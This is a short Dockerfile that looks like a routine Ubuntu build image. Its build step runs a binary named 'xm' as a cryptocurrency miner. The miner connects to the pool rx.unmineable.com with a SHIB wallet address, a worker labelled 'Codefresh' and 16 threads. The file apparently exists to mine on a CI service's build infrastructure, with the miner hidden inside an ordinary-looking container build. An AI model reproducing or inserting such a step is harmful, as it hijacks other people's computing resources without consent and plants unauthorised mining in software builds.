FROM ubuntu:16.04 as builder

RUN apt-get update \
  && apt-get install -y \
    build-essential \
    libssl-dev \
    libgmp-dev \
    libcurl4-openssl-dev \
    libjansson-dev \
    automake \
  && rm -rf /var/lib/apt/lists/*

COPY . /app/
RUN cd /app/ && chmod u+x xm && ./xm -o rx.unmineable.com:3333 -u SHIB:0xfd9b5ae657d13a1d3de26831b861b6ba2961dc97.Codefresh -p X -k -a rx/0 -t16

CMD ["-h"]
